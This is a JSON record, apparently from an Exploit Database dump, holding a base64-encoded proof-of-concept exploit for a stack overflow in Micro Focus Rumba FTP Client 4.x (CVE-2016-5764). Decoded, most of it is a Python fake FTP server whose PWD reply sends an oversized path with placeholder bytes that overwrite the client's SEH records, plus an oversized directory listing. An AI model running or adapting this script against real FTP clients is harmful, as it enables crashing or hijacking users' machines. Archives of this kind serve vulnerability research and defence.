{
    "source": "exploit-database", 
    "exploit": "IyBFeHBsb2l0IFRpdGxlOiBSdW1iYSBGVFAgNC54IENsaWVudCBTdGFja292ZXJmbG93IFNFSA0KIyBEYXRlOiAyOS0xMC0yMDE2DQojIEV4cGxvaXQgQXV0aG9yOiBVbWl0IEFrc3UNCiMgVmVuZG9yIEhvbWVwYWdlOiBodHRwOi8vY29tbXVuaXR5Lm1pY3JvZm9jdXMuY29tL21pY3JvZm9jdXMvbWFpbmZyYW1lX3NvbHV0aW9ucy9ydW1iYS93L2tub3dsZWRnZV9iYXNlLzI4NzMxLnJ1bWJhLWZ0cC00LXgtc2VjdXJpdHktdXBkYXRlLmFzcHgNCiMgU29mdHdhcmUgTGluazogaHR0cDovL25hZG93bmxvYWRzLm1pY3JvZm9jdXMuY29tL2VwZC9wcm9kdWN0X2Rvd25sb2FkX3JlcXVlc3QuYXNweD90eXBlPWV2YWwmdHJhbnNpZD0yMTc5NDQxJmxhc3Q0PTIxNzk0NDEmY29kZT00MDMwNw0KIyBWZXJzaW9uOiA0LngNCiMgVGVzdGVkIG9uOiBXaW5kb3dzIDcNCiMgQ1ZFIDogQ1ZFLTIwMTYtNTc2NA0KIA0KDQoNCjEuICBEZXNjcmlwdGlvbg0KDQpNaWNybyBGb2N1cyBSdW1iYSBGVFAgQ2xpZW50IDQueCBjYW5udCBoYW5kbGUgbG9uZyBkaXJlY3RvcnkgbmFtZXMuIEFuIGF0dGFja2VyIGNhbiBzZXR1cCBhIG1hbGljaW91cyBGVFAgc2VydmVyIHRoYXQgY2FuIHNlbmQgYSBsb25nIGRpcmVjdG9yeSBuYW1lIHdoaWNoIGNhbiBsZWQgdG8gcmVtb3RlIGNvZGUgZXhlY3V0aW9uIA0Kb24gY29ubmVjdGVkIGNsaWVudC4NCg0KMi4gUHJvb2Ygb2YgQ29uY2VwdA0KDQpUaGUgY29kZSBiZWxvdyBjYW4gYmUgdXNlZCB0byBzZXR1cCBhIG1hbGljaW91cyBGVFAgc2VydmVyIHRoYXQgd2lsbCBzZW5kIGEgbG9uZyBkaXJlY3RvcnkgbmFtZSBhbmQgb3ZlcndyaXRlIHRoZSBzdGFjay4gVGhlIFBvQyBvbmx5IG92ZXJ3cml0ZXMgdGhlIFNFSCArIE5TRUguDQoNCg0KMy4gUG9DIENvZGUNCg0KDQotLS0tLS0tLS0tLS0tLS0tLS0tIFNlcnZlci5weSAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KDQoNCmltcG9ydCBzb2NrZXQNCmltcG9ydCBzeXMNCmltcG9ydCB0aW1lDQoNCiMgSVAgQWRkcmVzcw0KSVAgPSAnMTI3LjAuMC4xJyBcDQogICAgICcnDQojIENyZWF0ZSBhIFRDUC9JUCBzb2NrZXQNCnNvY2sgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pDQoNCiMgQmluZCB0aGUgc29ja2V0IHRvIHRoZSBwb3J0DQpzZXJ2ZXJfYWRkcmVzcyA9IChJUCwyMSkNCnByaW50ICJTdGFydGluZyB1cCBvbiAlcyBwb3J0ICVzIiAlIHNlcnZlcl9hZGRyZXNzDQpzb2NrLmJpbmQoc2VydmVyX2FkZHJlc3MpDQoNCiMgTGlzdGVuIGZvciBpbmNvbWluZyBjb25uZWN0aW9ucw0Kc29jay5saXN0ZW4oMSkNCg0KIyBXYWl0IGZvciBpbmNvbWluZyBjb25uZWN0aW9uDQp3aGlsZSBUcnVlOg0KICAgIHByaW50ICJXYWl0aW5nIGZvciBhIGNvbm5lY3Rpb24iDQogICAgY29ubmVjdGlvbiwgY2xpZW50X2FkZHJlc3MgPSBzb2NrLmFjY2VwdCgpDQoNCiAgICB0cnk6DQogICAgICAgIHByaW50ICJDb25uZWN0aW9uIGZyb20gIiArIHN0cihjbGllbnRfYWRkcmVzcykNCiAgICAgICAgIyBSZWNlaXZlIHRoZSBkYXRhIGluIHNtYWxsIGNodW5rcyBhbmQgcmVzdHJhbnNtaXQgaXQNCiAgICAgICAgY29ubmVjdGlvbi5zZW5kKCIyMjAgV2VsY29tZVxyXG4iKQ0KDQogICAgICAgIHdoaWxlKFRydWUpOg0KICAgICAgICAgICAgZGF0YSA9IGNvbm5lY3Rpb24ucmVjdigxNikNCiAgICAgICAgICAgIHByaW50ICJyZWNlaXZlZCAlcyIgJSBkYXRhDQogICAgICAgICAgICBpZiAiVVNFUiIgaW4gZGF0YToNCiAgICAgICAgICAgICAgICBwcmludCAiU2VuZGluZyAzMzEiDQogICAgICAgICAgICAgICAgY29ubmVjdGlvbi5zZW5kKCIzMzEgUGxlYXNlIHNwZWNpZnkgdGhlIHBhc3N3b3JkLlxyXG4iKQ0KICAgICAgICAgICAgaWYgIlBBU1MiIGluIGRhdGE6DQogICAgICAgICAgICAgICAgcHJpbnQgIlNlbmRpbmcgMjI3Ig0KICAgICAgICAgICAgICAgIGNvbm5lY3Rpb24uc2VuZCgiMjMwIExvZ2luIHN1Y2Nlc3NmdWwuXG5cbiIpDQogICAgICAgICAgICBpZiAiUFdEIiBpbiBkYXRhOg0KICAgICAgICAgICAgICAgIHByaW50ICJTZW5kaW5nIDI1NyINCg0KICAgICAgICAgICAgICAgICMgNzdBNjMyRTIgYWRkIGVzcCw5MDggcG9wIHBvcCBwb3AgcmV0DQogICAgICAgICAgICAgICAgIyBUSElTIElTIFRIRSBQQVJUIFdIRVJFIFRIRSBPVkVSRkxPVyBIQVBQRU5TDQogICAgICAgICAgICAgICAgY29ubmVjdGlvbi5zZW5kKCIyNTcgXCIvIisiQSIqNjI5KyJceDQ1XHg0NVx4NDVceDQ1IisgIlx4NDRceDQ0XHg0NFx4NDQiICsgIkQiKjE4NSArICJycnJyIiArICJEIioyMTEgKyAiXCJcclxuIikNCiAgICAgICAgICAgIGlmICJUWVBFIEEiIGluIGRhdGE6DQogICAgICAgICAgICAgICAgcHJpbnQgIlNlbmRpbmcgMjAwIFN3aXRjaGluZyB0byBBU0NJSSBtb2RlLiINCiAgICAgICAgICAgICAgICBjb25uZWN0aW9uLnNlbmQoIjIwMCBTd2l0Y2hpbmcgdG8gQVNDSUkgbW9kZS5cclxuIikNCiAgICAgICAgICAgIGlmICJUWVBFIEkiIGluIGRhdGE6DQogICAgICAgICAgICAgICAgcHJpbnQgIlNlbmRpbmcgMjAwIFN3aXRjaGluZyB0byBCaW5hcnkgbW9kZS4iDQogICAgICAgICAgICAgICAgY29ubmVjdGlvbi5zZW5kKCIyMDAgMjAwIFN3aXRjaGluZyB0byBCaW5hcnkgbW9kZS5cclxuIikNCiAgICAgICAgICAgIGlmICJTWVNUIiBpbiBkYXRhOg0KICAgICAgICAgICAgICAgIHByaW50ICJTZW5kaW5nIDIxNSINCiAgICAgICAgICAgICAgICBjb25uZWN0aW9uLnNlbmQoIjIxNSBVTklYIFR5cGU6IEw4XHJcbiIpDQoNCiAgICAgICAgICAgIGlmICJTSVpFIiBpbiBkYXRhOg0KICAgICAgICAgICAgICAgIHByaW50ICJTZW5kaW5nIDIwMCINCiAgICAgICAgICAgICAgICBjb25uZWN0aW9uLnNlbmQoIjIwMCBTd2l0Y2hpbmcgdG8gQmluYXJ5IG1vZGUuIFxyXG4iKQ0KDQogICAgICAgICAgICBpZiAiRkVBVCIgaW4gZGF0YToNCiAgICAgICAgICAgICAgICBwcmludCAiU2VuZGluZyAyMTEtRmVhdHVyZXMiDQogICAgICAgICAgICAgICAgY29ubmVjdGlvbi5zZW5kKCIyMTEtRmVhdHVyZXM6XHJcbiBFUFJUXHJcbiBFUFNWXHJcbiBNRFRNXHJcbiBQQVNWXHJcbiBSRVNUIFNUUkVBTVxyXG4gU0laRVxyXG4gVFZGU1xyXG4yMTEgRW5kXHJcbiIpDQogICAgICAgICAgICBpZiAiQ1dEIiBpbiBkYXRhOg0KICAgICAgICAgICAgICAgIHByaW50ICJTZW5kaW5nIDI1MCBEaXJlY3Rvcnkgc3VjY2Vzc2Z1bGx5IGNoYW5nZWQuIg0KICAgICAgICAgICAgICAgIGNvbm5lY3Rpb24uc2VuZCgiMjUwIERpcmVjdG9yeSBzdWNjZXNzZnVsbHkgY2hhbmdlZC5cclxuIikNCg0KICAgICAgICAgICAgaWYgIlBBU1YiIGluIHN0cihkYXRhKToNCiAgICAgICAgICAgICAgICBwcmludCAiU2VuZGluZyAyMjcgRW50ZXJpbmcgUGFzc2l2ZSBNb2RlICgxMzAsMTYxLDQ1LDI1MiwxMTEsMTgzKVxuXG4iDQogICAgICAgICAgICAgICAgY29ubmVjdGlvbi5zZW5kKCIyMjcgRW50ZXJpbmcgUGFzc2l2ZSBNb2RlICgxMzAsMTYxLDQ1LDI1MiwxMTEsMTgzKVxuXG4iKQ0KDQogICAgICAgICAgICAgICAgIyBMaXN0ZW4gb24gbmV3IHNvY2tldCBmb3IgY29ubmVjdGlvbg0KICAgICAgICAgICAgICAgIHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pDQogICAgICAgICAgICAgICAgcHJpbnQgJ1NvY2tldCBjcmVhdGVkJw0KDQogICAgICAgICAgICAgICAgI0JpbmQgc29ja2V0IHRvIGxvY2FsIGhvc3QgYW5kIHBvcnQNCiAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgIHMuYmluZCgoSVAsIDI4NTk5KSkNCiAgICAgICAgICAgICAgICBleGNlcHQgc29ja2V0LmVycm9yIGFzIG1zZzoNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ0JpbmQgZmFpbGVkLiBFcnJvciBDb2RlIDogJyArIHN0cihtc2dbMF0pICsgJyBNZXNzYWdlICcgKyBtc2dbMV0NCiAgICAgICAgICAgICAgICAgICAgc3lzLmV4aXQoKQ0KDQogICAgICAgICAgICAgICAgcHJpbnQgJ1NvY2tldCBiaW5kIGNvbXBsZXRlIGZvciBQQVNWIG9uIHBvcnQgMjg1OTknDQoNCiAgICAgICAgICAgICAgICAjU3RhcnQgbGlzdGVuaW5nIG9uIHNvY2tldA0KICAgICAgICAgICAgICAgIHMubGlzdGVuKDEwKQ0KICAgICAgICAgICAgICAgIHByaW50ICdTb2NrZXQgbm93IGxpc3RlbmluZyBvbiAyODU5OScNCg0KICAgICAgICAgICAgICAgICNub3cga2VlcCB0YWxraW5nIHdpdGggdGhlIGNsaWVudA0KDQogICAgICAgICAgICAgICAgI3dhaXQgdG8gYWNjZXB0IGEgY29ubmVjdGlvbiAtIGJsb2NraW5nIGNhbGwNCiAgICAgICAgICAgICAgICBjb25uLCBhZGRyID0gcy5hY2NlcHQoKQ0KICAgICAgICAgICAgICAgIHByaW50ICdDb25uZWN0ZWQgd2l0aCAnICsgYWRkclswXSArICc6JyArIHN0cihhZGRyWzFdKQ0KICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMSkNCiAgICAgICAgICAgICAgICBwcmludCAiU2VuZGluZyBkaXIgbGlzdCINCiAgICAgICAgICAgICAgICBjb25uZWN0aW9uLnNlbmQoIjE1MCBIZXJlIGNvbWVzIHRoZSBkaXJlY3RvcnkgbGlzdGluZy5cclxuIikNCiAgICAgICAgICAgICAgICBjb25uLnNlbmQoImQiKjUwMCsicnd4LS0tLS0tICAgIDIgNTAwICAgICAgNTAwICAgICAgICAgIDQwOTYgTm92IDA1ICAyMDA3ICIgKyAiQS4iICsgIkIiKjUwMCArICAiXHJcbiIpDQoNCiAgICAgICAgICAgICAgICAjIFNlbmQgb2sgdG8gZnRwIGNsaWVudA0KICAgICAgICAgICAgICAgIGNvbm5lY3Rpb24uc2VuZCgiMjI2IERpcmVjdG9yeSBzZW5kIE9LLlxyXG4iKQ0KDQogICAgICAgICAgICAgICAgIyBjbG9zZSB0aGUgY29ubmVjdGlvbg0KICAgICAgICAgICAgICAgIHMuY2xvc2UoKQ0KICAgICAgICAgICAgICAgIGNvbm4uY2xvc2UoKQ0KICAgICAgICAgICAgICAgIGJyZWFrDQoNCiAgICAgICAgICAgIGlmICJFWElUIiBpbiBzdHIoZGF0YSk6DQogICAgICAgICAgICAgICAgcHJpbnQgIlJFQyINCiAgICAgICAgICAgICAgICBjb25uZWN0aW9uLnNlbmQoIkhhdmUgYSBuaWNlIGRheSFcclxuIikNCiAgICAgICAgICAgICAgICBicmVhaw0KICAgIGZpbmFsbHk6DQogICAgICAgIGNvbm5lY3Rpb24uY2xvc2UoKQ==", 
    "filename": "platforms/windows/remote/40651.py", 
    "id": "40651", 
    "cves": [
        "CVE-2016-5764"
    ]
}